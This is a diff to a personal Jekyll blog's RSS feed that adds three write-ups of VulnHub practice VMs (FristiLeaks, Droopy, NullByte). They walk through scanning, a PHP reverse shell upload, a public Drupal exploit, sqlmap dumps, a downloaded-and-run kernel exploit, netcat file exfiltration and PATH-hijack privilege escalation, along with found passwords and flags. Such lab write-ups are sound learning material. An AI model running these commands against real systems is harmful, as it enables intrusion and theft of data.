@@ -5,9 +5,334 @@
     <description></description>
     <link>http://yourdomain.com/</link>
     <atom:link href="http://yourdomain.com/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Thu, 18 Feb 2016 01:41:22 +0000</pubDate>
-    <lastBuildDate>Thu, 18 Feb 2016 01:41:22 +0000</lastBuildDate>
+    <pubDate>Fri, 03 Jun 2016 00:38:15 +0100</pubDate>
+    <lastBuildDate>Fri, 03 Jun 2016 00:38:15 +0100</lastBuildDate>
     <generator>Jekyll v3.1.1</generator>
+    
+      <item>
+        <title>vulnhub fristileaks vm</title>
+        <description>&lt;p&gt;Fun VM and did it on time! &lt;a href=&quot;https://www.vulnhub.com/entry/fristileaks-13,133/&quot;&gt;Fristileaks&lt;/a&gt;
+&lt;p&gt;So, the usual stuff:
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;sudo netdiscover -r 192.168.0.0/16&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt; My target is 192.168.1.90 .
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;sudo nmap -O -sT 192.168.1.90&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;pre&gt;
+Starting Nmap 6.47 ( http://nmap.org ) at 2016-06-01 22:16 WEST
+Nmap scan report for 192.168.1.90
+Host is up (0.00052s latency).
+Not shown: 999 filtered ports
+PORT   STATE SERVICE
+80/tcp open  http
+MAC Address: 08:00:27:A5:A6:76 (Cadmus Computer Systems)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running: Linux 2.6.X|3.X
+OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
+OS details: Linux 2.6.32 - 3.10
+Network Distance: 1 hop
+&lt;/pre&gt;
+&lt;p&gt; Found a port 80 open. Opened it in firefox and simple page with a image.
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;python wfuzz.py -c -z file,wordlist/general/common.txt --hc 404   http://192.168.1.90/FUZZ&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Only found one dir, &quot;images&quot;.
+&lt;p&gt;In that dir, there was an image http://192.168.1.90/images/3037440.jpg saying &quot;this is not the url you&#39;re looking for&quot; ... so what is the url ? Maybe hidden in the image as metadata?
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;exiftool 3037440.jpg&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Nope.
+&lt;p&gt;After a while ... a long while, trying to think how to find the correct url i fired nmap and nikto, maybe they could help me.
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;sudo nmap -A 192.168.1.90&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Found some Paths! Like /cola /sisi /beer ... nothing really. Neither one was helping showing the same image grrr...
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;./nikto.pl -mutate 1 -h 192.168.1.90
+./nikto.pl -mutate 1,2,3,4,5,6 -h 192.168.1.90&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;A big &quot;nope&quot;. After another longgg while it hit me!! &quot;/cola&quot;, &quot;/beer&quot; and the &quot;Keep calm and drink fristi&quot;!DUH! So, http://192.168.1.90/fristi/
+&lt;p&gt; A login-password form finally and an image! I did a view source and found a comment made by the programmer called eezeepz  and a meta tag. I first pointed at the meta tag saying:
+&lt;pre&gt;
+super leet password login-test page. We use base64 encoding for images so they are inline in the HTML. I read somewhere on the web, that thats a good way to do it.&quot;
+&lt;/pre&gt;
+&lt;p&gt;Scrolling down ther was some base64 code commented. Well i tried to insert that code in the image binary and it returned an image saying something like &quot;kekekekekKEKEKEKEK&quot;. &quot;what is this?&quot; I thought, &quot;this can&#39;t be a password&quot; but i tried it anyway, login: the user in the comment, password the text in the image and...
+&lt;p&gt;Login!
+&lt;p&gt;Now i could upload a file, the server runs php so i thought of php-reverse-shell upload... error file format not accepted. However, i knew some versions allow something like XXX.php.png and it will run the php code! I renamed it to .png and use the usual suspect for waiting a connection:
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;nc -lnvvp 12344&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Firefox pointing to http://192.168.1.90/fristi/uploads/php-reverse-shell.php.png and
+&lt;p&gt;SHELL!
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;uname -a&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;pre&gt;
+Linux localhost.localdomain 2.6.32-573.8.1.el6.x86_64 #1 SMP Tue Nov 10 18:01:38 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
+&lt;/pre&gt;
+&lt;p&gt;Walking down the /home got to eezeepz home dir, and it had some notes.txt on it:
+&lt;pre&gt;
+o EZ,
+
+I made it possible for you to do some automated checks,
+but I did only allow you access to /usr/bin/* system binaries. I did
+however copy a few extra often needed commands to my
+homedir: chmod, df, cat, echo, ps, grep, egrep so you can use those
+from /home/admin/
+
+Don&#39;t forget to specify the full path for each binary!
+
+Just put a file called &quot;runthis&quot; in /tmp/, each line one command. The
+output goes to the file &quot;cronresult&quot; in /tmp/. It should
+run every minute with my account privileges.
+
+- Jerry
+&lt;/pre&gt;
+&lt;p&gt;But the shell was bothering so:
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;python -c &lt;span class=&quot;s1&quot;&gt;&#39;import pty; pty.spawn(&quot;/bin/bash&quot;);&#39;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Ok, i knew i had to use this, but how ? So at my second try doing something useful i tried:
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/home/admin/chmod 777 /home/admin&quot;&lt;/span&gt; &amp;gt;runthis&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /home/admin
+ls -la
+whoisyourgodnow.txt &amp;lt;- fristigod is owner hmm&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt; Some pass. A encrypt file in python ... should i made a decrypt ?
+&lt;p&gt;i did , and got login for admin:
+&lt;pre&gt;
+import base64,codecs,sys
+
+#def encodeString(str):
+#    base64string= base64.b64encode(str)
+#    return codecs.encode(base64string[::-1], &#39;rot13&#39;)
+
+#cryptoResult=encodeString(sys.argv[1])
+#print cryptoResult
+
+print &quot;----&quot;
+
+def decodeString(str):
+   x=codecs.decode(str[::-1],&#39;rot13&#39;)
+   return base64.b64decode(x)
+
+a=decodeString(sys.argv[1])
+print a
+&lt;/pre&gt;
+&lt;p&gt;And password for admin is: thisisalsopw123
+&lt;p&gt;Then tried that crypted file owned by fristigod and got another password! :) The password was LetThereBeFristi!
+&lt;p&gt;I was feeling very smart at this moment.. i thought that the fristi&lt;b&gt;god&lt;/b&gt; would have some useful files on his home... eh, I still needed root! So more exploring, now I was in fristigod home...wtf nothing. not even hidden.
+&lt;p&gt; So i searched for files owned by the user:
+&lt;pre&gt;
+find / -user fristigod  
+&lt;/pre&gt;
+&lt;p&gt; Something hidden in /var ... and a root executable, doCom ? tried to run obviously and:
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;Nice try, but wrong user ;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;ehehe, fristigod can&#39;t sudo.. can admin ? noooo. Can i change permission of it like i did for home? i doubt it, but tried it: nah.
+&lt;p&gt;After hitting my head for a while i decided to view .bash_history in /var/fristigod
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;s2&quot;&gt;&quot;nothing&quot;&lt;/span&gt;
+&lt;span class=&quot;s2&quot;&gt;&quot;nothing&quot;&lt;/span&gt;
+sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
+&lt;span class=&quot;s2&quot;&gt;&quot;nothing, wait what ?&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Big duh! again. I tried and it needed a parameter.NO PROBLEM, take this:
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom /bin/sh&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;ROOT!
+&lt;p&gt;Now where is my flag!
+&lt;pre&gt;
+sh-4.1# cd /root
+cd /root
+sh-4.1# ls
+ls
+fristileaks_secrets.txt
+sh-4.1# cat fristileaks_secrets.txt
+cat fristileaks_secrets.txt
+Congratulations on beating FristiLeaks 1.0 by Ar0xA [https://tldr.nu]
+
+I wonder if you beat it in the maximum 4 hours it&#39;s supposed to take!
+
+Shoutout to people of #fristileaks (twitter) and #vulnhub (FreeNode)
+
+
+Flag: Y0u_kn0w_y0u_l0ve_fr1st1
+
+
+sh-4.1#
+&lt;/pre&gt;
+&lt;p&gt;WEEEEEE! Trully fun, no need for exploits just bad configurations! It was my first VM from start to end without advice, so i can say it was special :)
+&lt;p&gt;Time to check other people solutions!
+&lt;/p&gt;&lt;/p&gt;&lt;/p&gt;&lt;/p&gt;&lt;/p&gt;&lt;/p&gt;&lt;/p&gt;&lt;/p&gt;&lt;/p&gt;&lt;/p&gt;&lt;/p&gt;&lt;/p&gt;&lt;/p&gt;&lt;/p&gt;&lt;/p&gt;&lt;/p&gt;&lt;/p&gt;&lt;/p&gt;&lt;/p&gt;&lt;/p&gt;&lt;/p&gt;&lt;/p&gt;&lt;/p&gt;&lt;/p&gt;&lt;/p&gt;&lt;/p&gt;&lt;/p&gt;&lt;/p&gt;&lt;/p&gt;&lt;/p&gt;&lt;/p&gt;&lt;/p&gt;&lt;/p&gt;
+</description>
+        <pubDate>Thu, 26 May 2016 01:00:10 +0100</pubDate>
+        <link>http://yourdomain.com/vulnhub/2016/05/26/vulnhub-fristileaks-vm.html</link>
+        <guid isPermaLink="true">http://yourdomain.com/vulnhub/2016/05/26/vulnhub-fristileaks-vm.html</guid>
+        
+        
+        <category>vulnhub</category>
+        
+      </item>
+    
+      <item>
+        <title>vulnhub droopy vm</title>
+        <description>&lt;p&gt;Been a while since i played with vulnhub. So since yesterday i&#39;ve been trying to break &lt;a href=&quot;https://www.vulnhub.com/entry/droopy-v02,143/&quot;&gt;droopy&lt;/a&gt;, which i almost did ...
+&lt;p&gt;So, the usual stuff:
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;sudo netdiscover -r 192.168.0.0/16&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt; My target is 192.168.1.89 .
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;nmap -p- -sV 192.168.1.89&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt; Found a port 80 open. I followed it since it was the only one open and found a drupal website.
+&lt;br /&gt;I tried to create a user no luck, i searched for something interesting in the sub-directories:
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;python wfuzz.py -c -z file,wordlist/general/common.txt --hc 404   http://192.168.1.89/FUZZ&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;pre&gt;
+==================================================================
+ID	Response   Lines      Word         Chars          Request
+==================================================================
+
+00385:  C=301      9 L	      28 W	    314 Ch	  &quot;includes&quot;
+00491:  C=301      9 L	      28 W	    310 Ch	  &quot;misc&quot;
+00499:  C=301      9 L	      28 W	    313 Ch	  &quot;modules&quot;
+00675:  C=301      9 L	      28 W	    313 Ch	  &quot;scripts&quot;
+00724:  C=301      9 L	      28 W	    311 Ch	  &quot;sites&quot;
+&lt;/pre&gt;
+&lt;p&gt;... after a while decide to change and look for the drupal stuff. I found this gem &lt;a href=&quot;https://github.com/droope/droopescan&quot;&gt;droopescan&lt;/a&gt; and found drupal 7.3 was in usage.
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;./droopescan  scan drupal -u http://192.168.1.88/ -t 8&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;I don&#39;t usually ( at least i don&#39;t remember) hunt for exploits but his time this seemed a reasonable choice since it was an old version of drupal and i had no other ideia.
+&lt;p&gt;Found the exploit ... a pre-authentication one, wow. o.o !!
+&lt;a href=&quot;https://www.exploit-db.com/exploits/34992/&quot;&gt;the exploit&lt;/a&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;python 34992.py  -t http://192.168.1.88 -u impious -p impious&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;User created.
+
+&lt;p&gt; So, in the admin panel after a while trying to add a &quot;file uploader&quot; to the article i saw an item saying to enable PHP to run. I wonder if this is commom usage in other CMS and similar, like wordpress and stuff... must check this.
+&lt;br /&gt;In modules I set the PHP to ok and then set the possibility to add php code in &#39;articles&#39;. Next, i created a new article and used this &lt;a href=&quot;http://pentestmonkey.net/tools/web-shells/php-reverse-shell&quot;&gt;php reverse shell&lt;/a&gt; pointing to my computer. With the usual suspect netcat for the win:
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;nc -lnvvp 12344&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+I created an article with that PHP in the body!
+&lt;p&gt;&lt;b&gt;shell!&lt;/b&gt;
+
+&lt;p&gt;After fooling around in the server, moving around all directories i could remember,there was no commom user directories to see .bash_history and not much besides the mysql password with no further info in the database as well.
+I knew it was an old kernel, it&#39;s probably the first command i do whenever i connect to a server:
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;uname -a&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+Old old kernel... then again, i had no clue what to do next so i choose the easy path:
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /tmp
+wget https://www.kernel-exploits.com/media/ofs_64
+chmod +x ofs_64
+./ofs_64&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;b&gt;ROOT!&lt;/b&gt; Oh!
+&lt;p&gt;Reading the email in /var/spool/mail/www-data and the help hints i knew i had to use rockyou passwordlist against something and found the encrypted file in:
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;/root/dave.tc&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;So copied the file with netcat to my computer:
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;nc -lnvvp 12345 &amp;gt; dave.tc
+nc 192.168.1.73 12345 &amp;lt; dave.tc&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Well, then i gave up... i started cracking it with hashcat and went to do something else ... when i got back after 2 hours... no luck... wtf... i must have done something wrong.
+&lt;p&gt;I thought i did something wrong.. 2 exploits in one VM and still no flag?  Hm... so i went to check other people resolutions: it appears they filtered the rockyou by the word &#39;academy&#39; ( from the email in /var/spool/mail/www-data)... &lt;b&gt;i would never do that, honestly.&lt;/b&gt; I still fail to see that hint in the email :P . So then they mount the truecrypt and found the flag in an hidden folder.
+&lt;p&gt;Fun until root! :) After that i started wondering if what i was doing was ok, mainly those 2 exploits usage.
+&lt;/p&gt;&lt;/p&gt;&lt;/p&gt;&lt;/p&gt;&lt;/p&gt;&lt;/p&gt;&lt;/p&gt;&lt;/p&gt;&lt;/p&gt;&lt;/p&gt;&lt;/p&gt;&lt;/p&gt;&lt;/p&gt;&lt;/p&gt;&lt;/p&gt;&lt;/p&gt;&lt;/p&gt;
+</description>
+        <pubDate>Thu, 26 May 2016 01:00:10 +0100</pubDate>
+        <link>http://yourdomain.com/vulnhub/2016/05/26/vulnhub-droopy-vm.html</link>
+        <guid isPermaLink="true">http://yourdomain.com/vulnhub/2016/05/26/vulnhub-droopy-vm.html</guid>
+        
+        
+        <category>vulnhub</category>
+        
+      </item>
+    
+      <item>
+        <title>vulnhub nullbyte vm</title>
+        <description>&lt;p&gt;This is about nullbyte, a breakable vm from &lt;a href=&quot;http://www.vulnhub.com&quot;&gt;vulnhub&lt;/a&gt;. Vulnhub is the ultime playground if you like coding/security :)
+&lt;br /&gt;
+&lt;p&gt; I&#39;m using debian with the packages i need to play with these VM&#39;s, yes i could use kali or any other vm but those are overwhelming for me.
+&lt;p&gt; So let&#39;s get stated. Finding the machine:
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;sudo netdiscover -r 192.168.0.0/16&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;The one with name CADMUS COMPUTER SYSTEMS is the nullbyte machine. Next, let&#39;s check what it&#39;s running:
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;nmap -p- -sV 192.168.1.84&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Running apache on port 80, running ssh on port 777. There are other two services that i ignored.
+&lt;p&gt;So, i open browser and found a pretty much unuseful page e h... i tried to search for other directories/pages on the server so i used wfuzz.py and also made lame attempt to replace wfuzz.py. Just because. This lame attempt is visible in &lt;a href=&quot;https://github.com/impious/trash&quot;&gt;github&lt;/a&gt; as hfuzz.rb.
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;python wfuzz.py -c -z file,wordlist/general/common.txt --hc 404 -o html  http://192.168.1.84/FUZZ&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt; A few directories but the most import was &lt;b&gt;phpmyadmin&lt;/b&gt;. There must be something more than a simple html with an image. Neverless i couldn&#39;t find anything useful, so i took a glimpse at the &lt;a href=&quot;http://anthonyferrillo.net/blog/nullbyte-solution/&quot;&gt;walkthrough&lt;/a&gt; and saw that people checked the image.
+&lt;p&gt;By now i already knew that there was an url on the image, shamefully i know, but &#39;live and learn&#39;. Went through an opened it in the browser and saw that the newly found page had a form and message saying the password wasn&#39;t hard. Again, i build an brute forcer to found the password. You can check the code &lt;a href=&quot;https://github.com/impious/trash&quot;&gt;github&lt;/a&gt; as brute.rb. After a few minutes i found the password &#39;elite&#39;. Btw, for real brute forcing use hydra.
+&lt;p&gt;Anyway, a new form was found with a texbox on it. After playing around in the browser i found http://192.168.1.84/kzMb5nVYJw/420search.php which had a few data on it . That search smelled as sqli so i fired up sqlmap.py. Yes dump-all. No big databases on this playing vm&#39;s.
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;sqlmap -u http://192.168.1.84/kzMb5nVYJw/420search.php?usrtosearch&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;ramses --dump-all&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt; Got the password YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE from the output tables. So i searched it on google which pointed me to base64 and md5. Although it didn&#39;t have a &quot;=&quot; which usually means it&#39;s encode in base64  &lt;a href=&quot;https://www.base64decode.org/&quot;&gt;https://www.base64decode.org/&lt;/a&gt; to decode then to &lt;a href=&quot;https://hashkiller.co.uk/md5-decrypter.aspx&quot;&gt;https://hashkiller.co.uk/md5-decrypter.aspx&lt;/a&gt;. &lt;br /&gt;Password: omega.
+&lt;p&gt;Ok, now i had an user.
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;ssh ramses@192.168.1.84 -p 777&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt; First thing i always check is .bash_history.
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;cat .bash_history&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt; a file in backup and the website itself.
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /var/www&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Went through the directory tree and reached the 420search.php.
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;cat 420search.php&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt; Eheheh, by now i could login in phpmyadmin with root:sunnyvale. I also tried this login in command line with no luck.
+&lt;p&gt;In the .bash_history they pointed out the file &#39;procwatch&#39;, which owned/runned as root. I couldn&#39;t find anything more about it and it seemed to run a simple &#39;ps&#39;. After a while, i copied it to my computer with netcat:
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;nc -lnvvp 4444 &amp;gt; procwatch&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;nc 192.168.1.73 4444 &amp;lt; procwatch&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;I remembered a trick i read in other vm&#39;s walkthroughs, so i symlinked /bin/sh into ps and changed the  path to prioritize my symlinked:
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;ln -s /bin/sh ps
+&lt;span class=&quot;nb&quot;&gt;export &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;PATH&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;.:&lt;span class=&quot;nv&quot;&gt;$PATH&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;
+and then run the process and voilá, root. This was pure luck because i could only do that if the parameter passed which i assumed was &#39;ps&#39; didn&#39;t have the full path.
+&lt;br /&gt;&lt;p&gt; Saw other people resolution and i must learn how to gdb properly. Others created a newly ps and changed the path to prioritize. Anyway, my deadlock in this was one the damn image, Neverless it was pure fun. :)
+&lt;/p&gt;&lt;/p&gt;&lt;/p&gt;&lt;/p&gt;&lt;/p&gt;&lt;/p&gt;&lt;/p&gt;&lt;/p&gt;&lt;/p&gt;&lt;/p&gt;&lt;/p&gt;&lt;/p&gt;&lt;/p&gt;&lt;/p&gt;&lt;/p&gt;&lt;/p&gt;&lt;/p&gt;&lt;/p&gt;&lt;/p&gt;
+</description>
+        <pubDate>Tue, 01 Mar 2016 00:00:10 +0000</pubDate>
+        <link>http://yourdomain.com/vulnhub/2016/03/01/vulnhub-nullbyte-vm.html</link>
+        <guid isPermaLink="true">http://yourdomain.com/vulnhub/2016/03/01/vulnhub-nullbyte-vm.html</guid>
+        
+        
+        <category>vulnhub</category>
+        
+      </item>
     
       <item>
         <title>Welcome to Jekyll!</title>
